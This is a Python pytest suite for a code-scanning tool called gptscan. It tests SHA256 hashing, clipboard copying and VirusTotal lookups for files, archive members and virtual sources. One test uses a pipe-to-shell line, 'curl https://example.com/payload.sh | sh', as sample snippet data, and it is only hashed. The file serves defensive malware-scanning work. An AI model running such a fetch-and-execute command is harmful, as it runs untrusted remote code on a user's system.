import pytest
from unittest.mock import MagicMock, patch
import gptscan
import os
import json
import hashlib

@pytest.fixture
def mock_tree(monkeypatch):
    mock_tree = MagicMock()
    monkeypatch.setattr(gptscan, 'tree', mock_tree, raising=False)
    monkeypatch.setattr(gptscan, 'root', MagicMock(), raising=False)

    def mock_item_func(item_id, option=None):
        vals = mock_tree._item_values.get(item_id, ())
        if option == "values":
            return vals
        return {"values": vals}

    mock_tree.item.side_effect = mock_item_func
    mock_tree._item_values = {}
    return mock_tree

def test_get_file_sha256(tmp_path):
    d = tmp_path / "test"
    d.mkdir()
    f = d / "hello.txt"
    content = b"hello world"
    f.write_bytes(content)

    expected_hash = hashlib.sha256(content).hexdigest()
    assert gptscan.get_file_sha256(str(f)) == expected_hash

def test_get_file_sha256_not_found():
    assert gptscan.get_file_sha256("non_existent_file") == ""

def test_copy_sha256(mock_tree, tmp_path):
    f = tmp_path / "test.py"
    content = b"print('hello')"
    f.write_bytes(content)
    expected_hash = hashlib.sha256(content).hexdigest()

    mock_tree.selection.return_value = ["item1"]
    raw_values = [str(f), "90%", "Admin", "User", "80%", "print('hello')"]
    mock_tree._item_values["item1"] = (str(f), "90%", "Admin", "User", "80%", "print('hello')", json.dumps(raw_values))

    with patch('gptscan.update_status') as mock_status:
        gptscan.copy_sha256()

    mock_tree.clipboard_clear.assert_called_once()
    mock_tree.clipboard_append.assert_called_with(expected_hash)
    mock_status.assert_called()

def test_check_virustotal(mock_tree, tmp_path):
    f = tmp_path / "test.py"
    content = b"print('hello')"
    f.write_bytes(content)
    expected_hash = hashlib.sha256(content).hexdigest()

    mock_tree.selection.return_value = ["item1"]
    raw_values = [str(f), "90%", "Admin", "User", "80%", "print('hello')"]
    mock_tree._item_values["item1"] = (str(f), "90%", "Admin", "User", "80%", "print('hello')", json.dumps(raw_values))

    with patch('webbrowser.open') as mock_open, patch('gptscan.update_status') as mock_status:
        gptscan.check_virustotal()

    expected_url = f"https://www.virustotal.com/gui/file/{expected_hash}"
    mock_open.assert_called_once_with(expected_url)
    mock_status.assert_called()

def test_check_virustotal_with_path(tmp_path):
    f = tmp_path / "test.py"
    content = b"print('hello')"
    f.write_bytes(content)
    expected_hash = hashlib.sha256(content).hexdigest()

    with patch('webbrowser.open') as mock_open, patch('gptscan.update_status') as mock_status:
        gptscan.check_virustotal(str(f))

    expected_url = f"https://www.virustotal.com/gui/file/{expected_hash}"
    mock_open.assert_called_once_with(expected_url)

def test_copy_sha256_virtual_path(mock_tree):
    """Test that copy_sha256 hashes the snippet for virtual paths."""
    snippet = "print('virtual')"
    expected_hash = hashlib.sha256(snippet.encode('utf-8')).hexdigest()

    mock_tree.selection.return_value = ["item1"]
    raw_values = ["[Clipboard]", "50%", "", "", "", snippet]
    mock_tree._item_values["item1"] = ("[Clipboard]", "50%", "", "", "", snippet, json.dumps(raw_values))

    with patch('gptscan.update_status'):
        gptscan.copy_sha256()

    mock_tree.clipboard_clear.assert_called_once()
    mock_tree.clipboard_append.assert_called_with(expected_hash)

def test_check_virustotal_virtual_path(mock_tree):
    """Test that check_virustotal hashes the snippet for virtual paths."""
    snippet = "print('virtual')"
    expected_hash = hashlib.sha256(snippet.encode('utf-8')).hexdigest()

    mock_tree.selection.return_value = ["item1"]
    raw_values = ["[Stdin]", "50%", "", "", "", snippet]
    mock_tree._item_values["item1"] = ("[Stdin]", "50%", "", "", "", snippet, json.dumps(raw_values))

    with patch('webbrowser.open') as mock_open, patch('gptscan.update_status'):
        gptscan.check_virustotal()

    expected_url = f"https://www.virustotal.com/gui/file/{expected_hash}"
    mock_open.assert_called_once_with(expected_url)

def test_get_effective_sha256_uses_cache():
    """Test that get_effective_sha256 prioritizes the virtual source cache."""
    path = "test.zip[script.py]"
    full_content = "print('full content')"
    snippet = "print('snippet')"

    expected_hash = hashlib.sha256(full_content.encode('utf-8')).hexdigest()

    with patch.dict(gptscan._virtual_source_cache, {path: full_content}):
        h = gptscan.get_effective_sha256(path, snippet)
        assert h == expected_hash

def test_copy_sha256_archive_member(mock_tree):
    """Test that copy_sha256 hashes the full content from cache for archive members."""
    path = "test.zip[malicious.py]"
    full_content = "print('malicious full')"
    snippet = "print('archive')"
    expected_hash = hashlib.sha256(full_content.encode('utf-8')).hexdigest()

    mock_tree.selection.return_value = ["item1"]
    raw_values = [path, "50%", "", "", "", snippet]
    mock_tree._item_values["item1"] = (path, "50%", "", "", "", snippet, json.dumps(raw_values))

    with patch('gptscan.update_status'), \
         patch('os.path.exists', return_value=False), \
         patch.dict(gptscan._virtual_source_cache, {path: full_content}):
        gptscan.copy_sha256()

    mock_tree.clipboard_append.assert_called_with(expected_hash)

def test_check_virustotal_not_found(monkeypatch):
    mock_msgbox = MagicMock()
    monkeypatch.setattr(gptscan, 'messagebox', mock_msgbox)

    gptscan.check_virustotal("ghost.py")
    mock_msgbox.showwarning.assert_called_with("File Not Found", "The file 'ghost.py' could not be located.")


def test_check_virustotal_virtual_path_tree_lookup(mock_tree):
    """Test check_virustotal explicit virtual path string call looking up snippet from tree."""
    virtual_path = "[URL] https://example.com/malware"
    snippet = "curl https://example.com/payload.sh | sh"
    expected_hash = hashlib.sha256(snippet.encode('utf-8')).hexdigest()

    mock_tree.get_children.return_value = ["item1"]
    raw_values = [virtual_path, "80%", "", "", "", snippet]
    mock_tree._item_values["item1"] = (virtual_path, "80%", "", "", "", snippet, json.dumps(raw_values))

    with patch('webbrowser.open') as mock_open, patch('gptscan.update_status') as mock_status, patch('gptscan._get_item_raw_values', return_value=raw_values):
        gptscan.check_virustotal(virtual_path)

    expected_url = f"https://www.virustotal.com/gui/file/{expected_hash}"
    mock_open.assert_called_once_with(expected_url)
    mock_status.assert_called_once()


def test_check_virustotal_mass_selection_confirmation(mock_tree, monkeypatch):
    """Test check_virustotal confirmation dialog when >5 items are selected."""
    mock_tree.selection.return_value = [f"item{i}" for i in range(6)]
    mock_msgbox = MagicMock()
    monkeypatch.setattr(gptscan, 'messagebox', mock_msgbox)

    mock_msgbox.askyesno.return_value = False
    with patch('webbrowser.open') as mock_open:
        gptscan.check_virustotal()
        mock_open.assert_not_called()
    mock_msgbox.askyesno.assert_called_once()

    mock_msgbox.askyesno.reset_mock()
    mock_msgbox.askyesno.return_value = True
    for i in range(6):
        raw_vals = [f"[Virtual{i}]", "50%", "", "", "", f"snippet{i}"]
        mock_tree._item_values[f"item{i}"] = tuple(raw_vals)

    with patch('webbrowser.open') as mock_open, patch('gptscan.update_status') as mock_status, patch('gptscan._get_item_raw_values', side_effect=lambda item_id: list(mock_tree._item_values[item_id])):
        gptscan.check_virustotal()
        assert mock_open.call_count == 6
        mock_status.assert_called_with("Opening VirusTotal for 6 files...")


def test_check_virustotal_no_hashes_calculated(mock_tree, monkeypatch):
    """Test check_virustotal shows warning dialog when no valid hashes can be calculated."""
    mock_tree.selection.return_value = ["item1"]
    mock_tree._item_values["item1"] = ("nonexistent.py", "50%", "", "", "", "snippet")
    mock_msgbox = MagicMock()
    monkeypatch.setattr(gptscan, 'messagebox', mock_msgbox)

    with patch('os.path.exists', return_value=False), patch('gptscan._get_item_raw_values', return_value=["nonexistent.py", "50%", "", "", "", "snippet"]):
        gptscan.check_virustotal()

    mock_msgbox.showwarning.assert_called_once_with("Error", "Could not calculate hashes for selected files.")


def test_copy_sha256_multiple_files(mock_tree, tmp_path):
    """Test copy_sha256 with multiple selected items formatting status and clipboard."""
    f1 = tmp_path / "file1.py"
    f1.write_bytes(b"content1")
    hash1 = hashlib.sha256(b"content1").hexdigest()

    f2 = tmp_path / "file2.py"
    f2.write_bytes(b"content2")
    hash2 = hashlib.sha256(b"content2").hexdigest()

    mock_tree.selection.return_value = ["item1", "item2"]
    raw1 = [str(f1), "90%", "", "", "", "content1"]
    raw2 = [str(f2), "80%", "", "", "", "content2"]
    mock_tree._item_values["item1"] = tuple(raw1)
    mock_tree._item_values["item2"] = tuple(raw2)

    with patch('gptscan.update_status') as mock_status, patch('gptscan._get_item_raw_values', side_effect=lambda item_id: list(mock_tree._item_values[item_id])):
        gptscan.copy_sha256()

    mock_tree.clipboard_clear.assert_called_once()
    mock_tree.clipboard_append.assert_called_once_with(f"{hash1}\n{hash2}")
    mock_status.assert_called_once_with("Copied 2 SHA256 hashes.")


def test_copy_sha256_failure_warning(mock_tree, monkeypatch):
    """Test copy_sha256 shows warning dialog when hash calculation fails for all items."""
    mock_tree.selection.return_value = ["item1"]
    mock_msgbox = MagicMock()
    monkeypatch.setattr(gptscan, 'messagebox', mock_msgbox)

    with patch('gptscan._get_item_raw_values', return_value=None):
        gptscan.copy_sha256()

    mock_msgbox.showwarning.assert_called_once_with("Error", "Could not calculate file hashes.")


def test_threat_intel_empty_selection_and_no_tree(monkeypatch):
    """Test copy_sha256 and check_virustotal early returns when tree is None or selection is empty."""
    monkeypatch.setattr(gptscan, 'tree', None)
    gptscan.copy_sha256()
    gptscan.check_virustotal()

    mock_tree = MagicMock()
    mock_tree.selection.return_value = []
    monkeypatch.setattr(gptscan, 'tree', mock_tree)
    gptscan.copy_sha256()
    gptscan.check_virustotal()
    mock_tree.clipboard_clear.assert_not_called()
